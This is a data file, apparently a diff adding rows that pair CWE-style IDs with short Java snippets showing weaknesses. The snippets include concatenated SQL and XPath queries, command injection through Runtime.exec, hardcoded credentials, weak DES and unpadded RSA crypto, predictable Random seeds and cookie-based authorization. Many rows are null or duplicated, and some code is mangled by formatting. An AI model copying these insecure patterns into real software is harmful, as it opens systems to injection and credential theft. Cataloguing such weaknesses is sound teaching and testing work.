+179, String path = getInputPath();
+if (path.startsWith("/safe_dir/")){   File f = new File(path);
+return f.getCanonicalPath();
+ }
+179,null
+180, String path = getInputPath();
+if (path.startsWith("/safe_dir/")){   File f = new File(path);
+return f.getCanonicalPath();
+ }
+181,null
+408,null
+248, protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {   String ip = req.getRemoteAddr();
+InetAddress addr = InetAddress.getByName(ip);
+...
+out.println("hello " + addr.getHostName());
+ }
+600, protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {   String ip = req.getRemoteAddr();
+InetAddress addr = InetAddress.getByName(ip);
+...
+out.println("hello " + addr.getHostName());
+ }
+382, Public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {   try {     ...
+  } catch (ApplicationSpecificException ase) {     logger.error("Caught: " + ase.toString());
+System.exit(1);
+  } }
+395, try {    mysteryMethod();
+  } catch (NullPointerException npe) { }
+396,null
+397,null
+397,null
+455,null
+584, try {   ...
+throw IllegalArgumentException();
+ }finally {   return r;
+ }
+698,null
+768,null
+799,null
+307, String username = request.getParameter("username");
+String password = request.getParameter("password");
+ int authResult = authenticateUser(username, password);
+
+307,null
+307,null
+674,null
+835,null
+835, public boolean isReorderNeeded(String bookISBN, int rateSold) {   boolean isReorder = false;
+ int minimumCount = 10;
+int days = 0;
+  // get inventory count for book int inventoryCount = inventory.getIventoryCount(bookISBN);
+  // find number of days until inventory count reaches minimum while (inventoryCount > minimumCount) {       inventoryCount = inventoryCount - rateSold;
+days++;
+       }  // if number of days within reorder timeframe   // set reorder return boolean to true if (days > 0 &amp;
+&amp;
+ days < 5) {       isReorder = true;
+   } return isReorder;
+   }
+841,null
+1248,null
+1291,null
+184, public String removeScriptTags(String input, String mask) {   return input.replaceAll("script", mask);
+ }
+311,null
+311,null
+311, try {   URL u = new URL("http://www.secret.example.org/");
+HttpURLConnection hu = (HttpURLConnection) u.openConnection();
+hu.setRequestMethod("PUT");
+hu.connect();
+OutputStream os = hu.getOutputStream();
+hu.disconnect();
+ }catch (IOException e) {    //...
+    }
+312, response.addCookie( new Cookie("userAccountID", acctID);
+
+312,null
+312,null
+312, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+312,null
+312,null
+312,null
+312,null
+313, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+313,null
+315, response.addCookie( new Cookie("userAccountID", acctID);
+
+319, try {   URL u = new URL("http://www.secret.example.org/");
+HttpURLConnection hu = (HttpURLConnection) u.openConnection();
+hu.setRequestMethod("PUT");
+hu.connect();
+OutputStream os = hu.getOutputStream();
+hu.disconnect();
+ }catch (IOException e) { //...
+  }
+319,null
+328,null
+328, String plainText = new String(plainTextIn);
+MessageDigest encer = MessageDigest.getInstance("SHA");
+encer.update(plainTextIn);
+byte[] digest = password.digest();
+ //Login if hash matches stored hash if (equal(digest,secret_password())) {   login_user();
+ }
+327,null
+327, Cipher des=Cipher.getInstance("DES...
+");
+des.initEncrypt(key2);
+
+327,null
+327,null
+1240,null
+328,null
+328, String plainText = new String(plainTextIn);
+MessageDigest encer = MessageDigest.getInstance("SHA");
+encer.update(plainTextIn);
+byte[] digest = password.digest();
+ //Login if hash matches stored hash if (equal(digest,secret_password())) {   login_user();
+ }
+780, public Cipher getRSACipher() {   Cipher rsa = null;
+try {     rsa = javax.crypto.Cipher.getInstance("RSA/NONE/NoPadding");
+  }catch (java.security.NoSuchAlgorithmException e) {     log("this should never happen", e);
+  }catch (javax.crypto.NoSuchPaddingException e) {     log("this should never happen", e);
+  }return rsa;
+ }
+759,null
+759, String plainText = new String(plainTextIn);
+MessageDigest encer = MessageDigest.getInstance("SHA");
+encer.update(plainTextIn);
+byte[] digest = password.digest();
+ //Login if hash matches stored hash if (equal(digest,secret_password())) {   login_user();
+ }
+759,null
+330,null
+330, String GenerateReceiptURL(String baseUrl) {   Random ranGen = new Random();
+ranGen.setSeed((new Date()).getTime());
+return(baseUrl + ranGen.nextInt(400000000) + ".html");
+ }
+1204,null
+1204, public class SymmetricCipherTest {      public static void main() {       byte[] text ="Secret".getBytes();
+byte[] iv ={           0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00     };
+KeyGenerator kg = KeyGenerator.getInstance("DES");
+kg.init(56);
+SecretKey key = kg.generateKey();
+Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
+IvParameterSpec ips = new IvParameterSpec(iv);
+cipher.init(Cipher.ENCRYPT_MODE, key, ips);
+return cipher.doFinal(inpBytes);
+       }   }
+329,null
+329, public class SymmetricCipherTest {      public static void main() {       byte[] text ="Secret".getBytes();
+byte[] iv ={           0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00     };
+KeyGenerator kg = KeyGenerator.getInstance("DES");
+kg.init(56);
+SecretKey key = kg.generateKey();
+Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
+IvParameterSpec ips = new IvParameterSpec(iv);
+cipher.init(Cipher.ENCRYPT_MODE, key, ips);
+return cipher.doFinal(inpBytes);
+       }   }
+331,null
+331, String GenerateReceiptURL(String baseUrl) {   Random ranGen = new Random();
+ranGen.setSeed((new Date()).getTime());
+return(baseUrl + ranGen.nextInt(400000000) + ".html");
+ }
+333,null
+334,null
+6,null
+336, private static final long SEED = 1234567890;
+public int generateAccountID() {   Random random = new Random(SEED);
+return random.nextInt();
+ }
+336,null
+337, Random random = new Random(System.currentTimeMillis());
+int accountID = random.nextInt();
+
+337,null
+339,null
+338, Random random = new Random(System.currentTimeMillis());
+int accountID = random.nextInt();
+
+338,null
+341,null
+323,null
+323,null
+798, ...
+DriverManager.getConnection(url, "scott", "tiger");
+...
+
+798,null
+798, int VerifyAdmin(String password) {   if (!password.equals("Mew!")) {     return(0)  }//Diagnostic Modereturn(1);
+ }
+798,null
+798, public boolean VerifyAdmin(String password) {   if (password.equals("68af404b513073584c4b6f22b6c63e6b")) {     System.out.println("Entering Diagnostic Mode...
+");
+return true;
+  }System.out.println("Incorrect Password!");
+return false;
+ 
+798,null
+798, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+798,null
+259, ...
+DriverManager.getConnection(url, "scott", "tiger");
+...
+
+259,null
+259, int VerifyAdmin(String password) {   if (!password.equals("Mew!")) {     return(0)  }//Diagnostic Modereturn(1);
+ }
+259, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+259,null
+321,null
+321, public boolean VerifyAdmin(String password) {   if (password.equals("68af404b513073584c4b6f22b6c63e6b")) {     System.out.println("Entering Diagnostic Mode...
+");
+return true;
+  }System.out.println("Incorrect Password!");
+return false;
+ 
+321,null
+346, IntentFilter filter = new IntentFilter("com.example.RemoveUser");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ public class DeleteReceiver extends BroadcastReceiver {   @Overridepublic void onReceive(Context context, Intent intent) {     int userID = intent.getIntExtra("userID");
+destroyUserData(userID);
+  } }
+346,// Android @Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url){      if (url.substring(0,14).equalsIgnoreCase("examplescheme:")){       if(url.substring(14,25).equalsIgnoreCase("getUserInfo")){         writeDataToView(view, UserData);
+return false;
+    }else{         return true;
+    }   }   }
+346,null
+347, File f = new File(downloadedFilePath);
+JarFile jf = new JarFile(f);
+
+348,null
+352,null
+352,null
+353, while(true) {   DatagramPacket rp = new DatagramPacket(rData,rData.length);
+outSock.receive(rp);
+InetAddress IPAddress = rp.getAddress();
+int port = rp.getPort();
+out = secret.getBytes();
+DatagramPacket sp =new DatagramPacket(out, out.length, IPAddress, port);
+outSock.send(sp);
+ }
+354,null
+354, while(true) {   DatagramPacket packet = new DatagramPacket(data,data.length,IPAddress, port);
+socket.send(sendPacket);
+ }
+360, public void actionPerformed(ActionEvent e) {   if (e.getSource() == button) {     System.out.println("print out secret information");
+  } }
+494, URL[] classURLs= new URL[]{   new URL("file:subdir/") };
+URLClassLoader loader = new URLClassLoader(classURLs);
+Class loadedClass = Class.forName("loadMe", true, loader);
+
+494,null
+602,null
+565, Cookie[] cookies = request.getCookies();
+for (int i =0;
+ i< cookies.length;
+ i++) {   Cookie c = cookies[i];
+if (c.getName().equals("role")) {     userRole = c.getValue();
+  } }
+784, Cookie[] cookies = request.getCookies();
+for (int i =0;
+ i< cookies.length;
+ i++) {   Cookie c = cookies[i];
+if (c.getName().equals("role")) {     userRole = c.getValue();
+  } }
+784,null
+784, Cookie[] cookies = request.getCookies();
+for (int i =0;
+ i< cookies.length;
+ i++) {   Cookie c = cookies[i];
+if (c.getName().equals("authenticated") &amp;
+&amp;
+ Boolean.TRUE.equals(c.getValue())) {     authenticated = true;
+  } }
+308,null
+308, String plainText = new String(plainTextIn);
+MessageDigest encer = MessageDigest.getInstance("SHA");
+encer.update(plainTextIn);
+byte[] digest = password.digest();
+ //Login if hash matches stored hash if (equal(digest,secret_password())) {   login_user();
+ }
+309,null
+309, String plainText = new String(plainTextIn);
+MessageDigest encer = MessageDigest.getInstance("SHA");
+encer.update(plainTextIn);
+byte[] digest = password.digest();
+ //Login if hash matches stored hash if (equal(digest,secret_password())) {   login_user();
+ }
+778,null
+778, if LoginUser(){    // Login successful RunProgram();
+  } else {    // Login unsuccessful LoginRetry();
+  }
+778,null
+807, Cookie[] cookies = request.getCookies();
+for (int i =0;
+ i< cookies.length;
+ i++) {   Cookie c = cookies[i];
+if (c.getName().equals("role")) {     userRole = c.getValue();
+  } }
+807,null
+807, Cookie[] cookies = request.getCookies();
+for (int i =0;
+ i< cookies.length;
+ i++) {   Cookie c = cookies[i];
+if (c.getName().equals("authenticated") &amp;
+&amp;
+ Boolean.TRUE.equals(c.getValue())) {     authenticated = true;
+  } }
+807,null
+807, String ip = request.getRemoteAddr();
+InetAddress addr = InetAddress.getByName(ip);
+if (addr.getCanonicalHostName().endsWith("trustme.com")) {   trusted = true;
+ }
+807,null
+302, boolean authenticated = new Boolean(getCookieValue("authenticated")).booleanValue();
+if (authenticated) {   ...
+ }
+350,null
+350, String ip = request.getRemoteAddr();
+InetAddress addr = InetAddress.getByName(ip);
+if (addr.getCanonicalHostName().endsWith("trustme.com")) {   trusted = true;
+ }
+350,null
+350,null
+350, while(true) {      DatagramPacket rp=new DatagramPacket(rData,rData.length);
+outSock.receive(rp);
+String in = new String(p.getData(),0, rp.getLength());
+InetAddress IPAddress = rp.getAddress();
+int port = rp.getPort();
+if ((rp.getHostName()==...
+) &amp;
+ (in==...
+)) {       out = secret.getBytes();
+DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port);
+outSock.send(sp);
+       }   }
+784, Cookie[] cookies = request.getCookies();
+for (int i =0;
+ i< cookies.length;
+ i++) {   Cookie c = cookies[i];
+if (c.getName().equals("role")) {     userRole = c.getValue();
+  } }
+784,null
+784, Cookie[] cookies = request.getCookies();
+for (int i =0;
+ i< cookies.length;
+ i++) {   Cookie c = cookies[i];
+if (c.getName().equals("authenticated") &amp;
+&amp;
+ Boolean.TRUE.equals(c.getValue())) {     authenticated = true;
+  } }
+697, public class Truck {      private String make;
+private String model;
+private int year;
+ public boolean equals(Object o) {            if (o == null) return false;
+if (o == this) return true;
+if (!(o instanceof Truck)) return false;
+ Truck t = (Truck) o;
+ return (this.make.equals(t.getMake()) &amp;
+&amp;
+ this.model.equals(t.getModel()));
+       }   }
+697,null
+1023, public class Truck {      private String make;
+private String model;
+private int year;
+ public boolean equals(Object o) {            if (o == null) return false;
+if (o == this) return true;
+if (!(o instanceof Truck)) return false;
+ Truck t = (Truck) o;
+ return (this.make.equals(t.getMake()) &amp;
+&amp;
+ this.model.equals(t.getModel()));
+       }   }
+1023,null
+184, public String removeScriptTags(String input, String mask) {   return input.replaceAll("script", mask);
+ }
+187,null
+478,null
+478, public static final String INTEREST_RATE_AT_ZERO_POINTS = "5.00";
+public static final String INTEREST_RATE_AT_ONE_POINTS = "4.75";
+public static final String INTEREST_RATE_AT_TWO_POINTS = "4.50";
+...
+public BigDecimal getInterestRate(int points) {      BigDecimal result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);
+ switch (points) {            case 0:           result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);
+break;
+      case 1:           result = new BigDecimal(INTEREST_RATE_AT_ONE_POINTS);
+break;
+      case 2:           result = new BigDecimal(INTEREST_RATE_AT_TWO_POINTS);
+break;
+            }return result;
+   }
+478,null
+478, let step = input1 + input2;
+ switch(step) {    case 1:      alert("Process step 1.");
+ break;
+   case 2:      alert("Process step 2.");
+ break;
+   case 3:      alert("Process step 3.");
+ break;
+    } // program execution continues...
+
+478,null
+1025, String str1 = new String("Hello");
+String str2 = new String("Hello");
+if (str1 == str2) {   System.out.println("str1 == str2");
+ }
+486, if (inputClass.getClass().getName().equals("TrustedClassName")) {    // Do something assuming you trust inputClass   // ...
+    }
+486, public class TrustedClass {      ...
+ @Overridepublic boolean equals(Object obj) {            boolean isEquals = false;
+  // first check to see if the object is of the same class if (obj.getClass().getName().equals(this.getClass().getName())) {            // then compare object fields ...
+if (...
+) {               isEquals = true;
+       }           } return isEquals;
+       } ...
+   }
+595, String str1 = new String("Hello");
+String str2 = new String("Hello");
+if (str1 == str2) {   System.out.println("str1 == str2");
+ }
+595, public boolean isSameAccount(BankAccount accountA, BankAccount accountB) {   return accountA == accountB;
+ }
+597, String str1 = new String("Hello");
+String str2 = new String("Hello");
+if (str1 == str2) {   System.out.println("str1 == str2");
+ }
+597,<p id="ieq3s1" type="text">(i === s1) is FALSE</p> <p id="s4eq3i" type="text">(s4 === i) is FALSE</p> <p id="s4eq3s1" type="text">(s4 === s1) is FALSE</p>  var i = 65;
+ var s1 = '65';
+ var s4 = new String('65');
+  if (i === s1) { document.getElementById("ieq3s1").innerHTML = "(i === s1) is TRUE";
+ }  if (s4 === i) { document.getElementById("s4eq3i").innerHTML = "(s4 === i) is TRUE";
+ }  if (s4 === s1) { document.getElementById("s4eq3s1").innerHTML = "(s4 === s1) is TRUE";
+ }
+597,null
+1254,null
+942,null
+942,null
+185,null
+185,null
+777,null
+777,null
+1247,null
+1261,null
+1332,null
+228, ...
+ IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ ...
+  public class UrlHandlerReceiver extends BroadcastReceiver {      @Overridepublic void onReceive(Context context, Intent intent) {            if("com.example.URLHandler.openURL".equals(intent.getAction())) {           String URL = intent.getStringExtra("URLToOpen");
+int length = URL.length();
+       ...
+ }       }   }
+230, ...
+ IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ ...
+  public class UrlHandlerReceiver extends BroadcastReceiver {      @Overridepublic void onReceive(Context context, Intent intent) {            if("com.example.URLHandler.openURL".equals(intent.getAction())) {           String URL = intent.getStringExtra("URLToOpen");
+int length = URL.length();
+       ...
+ }       }   }
+232, String address = request.getParameter("address");
+address = address.trim();
+String updateString = "UPDATE shippingInfo SET address='?' WHERE email='cwe@example.com'";
+emailAddress = con.prepareStatement(updateString);
+emailAddress.setString(1, address);
+
+233, ...
+ IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ ...
+  public class UrlHandlerReceiver extends BroadcastReceiver {      @Overridepublic void onReceive(Context context, Intent intent) {            if("com.example.URLHandler.openURL".equals(intent.getAction())) {           String URL = intent.getStringExtra("URLToOpen");
+int length = URL.length();
+       ...
+ }       }   }
+234,null
+234,null
+130,null
+248, protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {   String ip = req.getRemoteAddr();
+InetAddress addr = InetAddress.getByName(ip);
+...
+out.println("hello " + addr.getHostName());
+ }
+600, protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {   String ip = req.getRemoteAddr();
+InetAddress addr = InetAddress.getByName(ip);
+...
+out.println("hello " + addr.getHostName());
+ }
+333,null
+392, try {    // Something that may throw an exception. ...
+   } catch (Throwable t) {   logger.error("Caught: " + t.toString());
+return;
+ }
+393, try {    // something that might throw IOException ...
+   } catch (IOException ioe) {   response.sendError(SC_NOT_FOUND);
+ }
+397,null
+397,null
+754,null
+754,null
+754,null
+754, FileInputStream fis;
+byte[] byteArray = new byte[1024];
+for (Iterator i=users.iterator();
+ i.hasNext();
+) {      String userName = (String) i.next();
+String pFileName = PFILE_ROOT + "/" + userName;
+FileInputStream fis = new FileInputStream(pFileName);
+fis.read(byteArray);
+ // the file is always 1k bytesfis.close();
+processPFile(userName, byteArray);
+   
+754, String itemName = request.getParameter(ITEM_NAME);
+if (itemName.compareTo(IMPORTANT_ITEM) == 0) {   ...
+ }...
+
+754, String itemName = request.Item(ITEM_NAME);
+if (itemName.Equals(IMPORTANT_ITEM)) {   ...
+ }...
+
+754, System.clearProperty("os.name");
+...
+String os = System.getProperty("os.name");
+if (os.equalsIgnoreCase("Windows 95")) System.out.println("Not supported");
+
+754,null
+754,null
+754,null
+754, private File readFile = null;
+ public void setInputFile(String inputFile) {    // create readFile File object from string containing name of file    } public void readFromFile() {      try {            reader = new FileReader(readFile);
+  // read input file        } catch (FileNotFoundException ex) {...
+}   }
+252,null
+252,null
+252,null
+252,null
+252, FileInputStream fis;
+byte[] byteArray = new byte[1024];
+for (Iterator i=users.iterator();
+ i.hasNext();
+) {      String userName = (String) i.next();
+String pFileName = PFILE_ROOT + "/" + userName;
+FileInputStream fis = new FileInputStream(pFileName);
+fis.read(byteArray);
+ // the file is always 1k bytesfis.close();
+processPFile(userName, byteArray);
+   
+252, String itemName = request.getParameter(ITEM_NAME);
+if (itemName.compareTo(IMPORTANT_ITEM) == 0) {   ...
+ }...
+
+252, String itemName = request.Item(ITEM_NAME);
+if (itemName.Equals(IMPORTANT_ITEM)) {   ...
+ }...
+
+252, System.clearProperty("os.name");
+...
+String os = System.getProperty("os.name");
+if (os.equalsIgnoreCase("Windows 95")) System.out.println("Not supported");
+
+252,null
+252,null
+252,null
+253,null
+273,null
+354,null
+354, while(true) {   DatagramPacket packet = new DatagramPacket(data,data.length,IPAddress, port);
+socket.send(sendPacket);
+ }
+391, try {   doExchange();
+ }catch (RareException e) {    // this can never happen    }
+476,null
+476, String cmd = System.getProperty("cmd");
+cmd = cmd.trim();
+
+476, ...
+ IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ ...
+  public class UrlHandlerReceiver extends BroadcastReceiver {      @Overridepublic void onReceive(Context context, Intent intent) {            if("com.example.URLHandler.openURL".equals(intent.getAction())) {           String URL = intent.getStringExtra("URLToOpen");
+int length = URL.length();
+       ...
+ }       }   }
+209, try {   /...
+/ }catch (Exception e) {   System.out.println(e);
+ }
+209,null
+209,null
+209, public BankAccount getUserBankAccount(String username, String accountNumber) {      BankAccount userAccount = null;
+String query = null;
+try {       if (isAuthorizedUser(username)) {         query = "SELECT * FROM accounts WHERE owner = "+ username + " AND accountID = " + accountNumber;
+DatabaseManager dbManager = new DatabaseManager();
+Connection conn = dbManager.getConnection();
+Statement stmt = conn.createStatement();
+ResultSet queryResult = stmt.executeQuery(query);
+userAccount = (BankAccount)queryResult.getObject(accountNumber);
+    }   } catch (SQLException ex) {       String logMessage = "Unable to retrieve account information from database,\nquery: " + query;
+Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);
+   }return userAccount;
+   }
+210,null
+536, public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {      String username = request.getParameter("username");
+  // May cause unchecked NullPointerException. if (username.length() < 10) {       ...
+   }   }
+537, public class InputFileRead {      private File readFile = null;
+private FileReader reader = null;
+private String inputFilePath = null;
+private final String DEFAULT_FILE_PATH = "c:\\somedirectory\\";
+ public InputFileRead() {       inputFilePath = DEFAULT_FILE_PATH;
+   } public void setInputFile(String inputFile) {        /* Assume appropriate validation / encoding is used and privileges / permissions are preserved */        } public void readInputFile() {            try {           reader = new FileReader(readFile);
+...
+     } catch (RuntimeException rex) {           System.err.println("Error: Cannot open input file in the directory " + inputFilePath);
+System.err.println("Input file has not been set, call setInputFile method before calling readInputFile");
+       } catch (FileNotFoundException ex) {...
+}       }   }
+537, public class BankManagerLoginServlet extends HttpServlet {      protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {            try {            // Get username and password from login page request String username = request.getParameter("username");
+String password = request.getParameter("password");
+ // Authenticate user BankManager bankMgr = new BankManager();
+boolean isAuthentic = bankMgr.authenticateUser(username, password);
+ // If user is authenticated then go to successful login page if (isAuthentic) {               request.setAttribute("login", new String("Login Successful."));
+getServletContext().getRequestDispatcher("/BankManagerServiceLoggedIn.jsp"). forward(request, response);
+       }else {                // Otherwise, raise failed login exception and output unsuccessful login message to error page throw new FailedLoginException("Failed Login for user " + username + " with password " + password);
+               }           } catch (FailedLoginException ex) {            // output failed login message to error page request.setAttribute("error", new String("Login Error"));
+request.setAttribute("message", ex.getMessage());
+getServletContext().getRequestDispatcher("/ErrorPage.jsp").forward(request, response);
+           }       }   
+390,null
+390,null
+390, public String readFile(String filename) {      String retString = null;
+try {            // initialize File and FileReader objectsFile file = new File(filename);
+FileReader fr = new FileReader(file);
+ // initialize character bufferlong fLen = file.length();
+char[] cBuf = new char[(int) fLen];
+ // read data from fileint iRead = fr.read(cBuf, 0, (int) fLen);
+ // close filefr.close();
+ retString = new String(cBuf);
+       } catch (Exception ex) {       /* do nothing, but catch so it'll compile...
+ */   }return retString;
+   }
+395, try {    mysteryMethod();
+  } catch (NullPointerException npe) { }
+396,null
+460, public class foo {      public static final void main( String args[] ) {       boolean returnValue;
+returnValue=doStuff();
+       }public static final boolean doStuff( ) {       boolean threadLock;
+boolean truthvalue=true;
+try {           while( //check some condition ) {               threadLock=true;
+ //do some stuff to truthvaluethreadLock=false;
+               }           }catch (Exception e){           System.err.println("You did something bad");
+if (something) return truthvalue;
+           }return truthvalue;
+       }   }
+455,null
+756, Public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {   try {     ...
+  } catch (ApplicationSpecificException ase) {     logger.error("Caught: " + ase.toString());
+  } }
+756,null
+7, Public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {   try {     ...
+  } catch (ApplicationSpecificException ase) {     logger.error("Caught: " + ase.toString());
+  } }
+116,null
+116,null
+116,null
+116,null
+117, String val = request.getParameter("val");
+try {   int value = Integer.parseInt(val);
+   }catch (NumberFormatException) {   log.info("Failed to parse val = " + val);
+ }...
+
+644, response.addHeader(HEADER_NAME, untrustedRawInputData);
+
+838,null
+790,null
+791,null
+792,null
+793,null
+794,null
+795,null
+795,null
+796,null
+797,null
+176,null
+20, ...
+public static final double price = 20.00;
+int quantity = currentUser.getAttribute("quantity");
+double total = price * quantity;
+chargeUser(total);
+...
+
+20,null
+20,null
+20, private void buildList ( int untrustedListSize ){   if ( 0 > untrustedListSize ){     die("Negative value supplied for list size, die evil hacker!");
+  }Widget[] list = new Widget [ untrustedListSize ];
+list[0] = new Widget();
+ }
+20, ...
+ IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ ...
+  public class UrlHandlerReceiver extends BroadcastReceiver {      @Overridepublic void onReceive(Context context, Intent intent) {            if("com.example.URLHandler.openURL".equals(intent.getAction())) {           String URL = intent.getStringExtra("URLToOpen");
+int length = URL.length();
+       ...
+ }       }   }
+102,null
+105,null
+106, public class RegistrationForm extends org.apache.struts.action.ActionForm {  // private variables for registration form private String name;
+private String email;
+...
+ public RegistrationForm() {     super();
+  }  // getter and setter methods for private variables ...
+ }
+109,null
+1284, ...
+public static final double price = 20.00;
+int quantity = currentUser.getAttribute("quantity");
+double total = price * quantity;
+chargeUser(total);
+...
+
+1284,null
+606,null
+606,null
+789,null
+789, unsigned int size = GetUntrustedInt();
+HashMap list = new HashMap(size);
+
+789,null
+789,null
+789,null
+789,null
+1285,null
+1285, // Method called from servlet to obtain product information public String displayProductSummary(int index) {      String productSummary = new String("");
+ try {       String productSummary = getProductSummary(index);
+     } catch (Exception ex) {...
+} return productSummary;
+   } public String getProductSummary(int index) {   return products[index];
+ }
+1285,null
+129, public String getValue(int index) {   return array[index];
+ }
+129, private void buildList ( int untrustedListSize ){   if ( 0 > untrustedListSize ){     die("Negative value supplied for list size, die evil hacker!");
+  }Widget[] list = new Widget [ untrustedListSize ];
+list[0] = new Widget();
+ }
+129,null
+129,null
+129, // Method called from servlet to obtain product information public String displayProductSummary(int index) {      String productSummary = new String("");
+ try {       String productSummary = getProductSummary(index);
+     } catch (Exception ex) {...
+} return productSummary;
+   } public String getProductSummary(int index) {   return products[index];
+ }
+129,null
+1286, // Read DOM try {   ...
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+factory.setValidating( false );
+...
+.c_dom = factory.newDocumentBuilder().parse( xmlFile );
+ } catch(Exception ex) {   ...
+ }
+112, // Read DOM try {   ...
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+factory.setValidating( false );
+...
+.c_dom = factory.newDocumentBuilder().parse( xmlFile );
+ } catch(Exception ex) {   ...
+ }
+112, DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();
+builderFactory.setNamespaceAware(true);
+DocumentBuilder builder = builderFactory.newDocumentBuilder();
+
+179, String path = getInputPath();
+if (path.startsWith("/safe_dir/")){   File f = new File(path);
+return f.getCanonicalPath();
+ }
+179,null
+180, String path = getInputPath();
+if (path.startsWith("/safe_dir/")){   File f = new File(path);
+return f.getCanonicalPath();
+ }
+181,null
+228, ...
+ IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ ...
+  public class UrlHandlerReceiver extends BroadcastReceiver {      @Overridepublic void onReceive(Context context, Intent intent) {            if("com.example.URLHandler.openURL".equals(intent.getAction())) {           String URL = intent.getStringExtra("URLToOpen");
+int length = URL.length();
+       ...
+ }       }   }
+230, ...
+ IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ ...
+  public class UrlHandlerReceiver extends BroadcastReceiver {      @Overridepublic void onReceive(Context context, Intent intent) {            if("com.example.URLHandler.openURL".equals(intent.getAction())) {           String URL = intent.getStringExtra("URLToOpen");
+int length = URL.length();
+       ...
+ }       }   }
+232, String address = request.getParameter("address");
+address = address.trim();
+String updateString = "UPDATE shippingInfo SET address='?' WHERE email='cwe@example.com'";
+emailAddress = con.prepareStatement(updateString);
+emailAddress.setString(1, address);
+
+233, ...
+ IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ ...
+  public class UrlHandlerReceiver extends BroadcastReceiver {      @Overridepublic void onReceive(Context context, Intent intent) {            if("com.example.URLHandler.openURL".equals(intent.getAction())) {           String URL = intent.getStringExtra("URLToOpen");
+int length = URL.length();
+       ...
+ }       }   }
+234,null
+234,null
+130,null
+130,null
+74,null
+74,null
+77,null
+77, ...
+String btype = request.getParameter("backuptype");
+String cmd = new String("cmd.exe /K \"   c:\\util\\rmanDB.bat "+btype+"&amp;
+&amp;
+c:\\utl\\cleanup.bat\"")  System.Runtime.getRuntime().exec(cmd);
+...
+
+77, ...
+String home = System.getProperty("APPHOME");
+String cmd = home + INITCMD;
+java.lang.Runtime.getRuntime().exec(cmd);
+...
+
+77,null
+78,null
+78,null
+78,null
+78, String script = System.getProperty("SCRIPTNAME");
+if (script != null)   System.exec(script);
+ 
+78, public String coordinateTransformLatLonToUTM(String coordinates){      String utmCoords = null;
+try {            String latlonCoords = coordinates;
+Runtime rt = Runtime.getRuntime();
+Process exec = rt.exec("cmd.exe /C latlon2utm.exe -" + latlonCoords);
+ // process results of coordinate transform   // ...
+        }catch(Exception e) {...
+}return utmCoords;
+   }
+78, ...
+String btype = request.getParameter("backuptype");
+String cmd = new String("cmd.exe /K \"   c:\\util\\rmanDB.bat "+btype+"&amp;
+&amp;
+c:\\utl\\cleanup.bat\"")  System.Runtime.getRuntime().exec(cmd);
+...
+
+88,null
+79,null
+79,null
+79,null
+79,null
+79,null
+79,null
+79,null
+79,null
+80,null
+87, public String preventXSS(String input, String mask) {   return input.replaceAll("script", mask);
+ }
+643, XPath xpath = XPathFactory.newInstance().newXPath();
+XPathExpression xlogin = xpath.compile("//users/user[login/text()='" + login.getUserName() + "' and password/text() = '" + login.getPassword() + "']/home_dir/text()");
+Document d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File("db.xml"));
+String homedir = xlogin.evaluate(d);
+
+93, logger.info("User's street address: " + request.getParameter("streetAddress"));
+
+113, String author = request.getParameter(AUTHOR_PARAM);
+...
+Cookie cookie = new Cookie("author", author);
+cookie.setMaxAge(cookieExpiration);
+response.addCookie(cookie);
+
+95,null
+95,null
+643, XPath xpath = XPathFactory.newInstance().newXPath();
+XPathExpression xlogin = xpath.compile("//users/user[login/text()='" + login.getUserName() + "' and password/text() = '" + login.getPassword() + "']/home_dir/text()");
+Document d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File("db.xml"));
+String homedir = xlogin.evaluate(d);
+
+89,null
+89,null
+89,null
+89,null
+89,null
+564, String street = getStreetFromUser();
+Query query = session.createQuery("from Address a where a.street='" + street + "'");
+
+90, context = new InitialDirContext(env);
+String searchFilter = "StreetAddress=" + address;
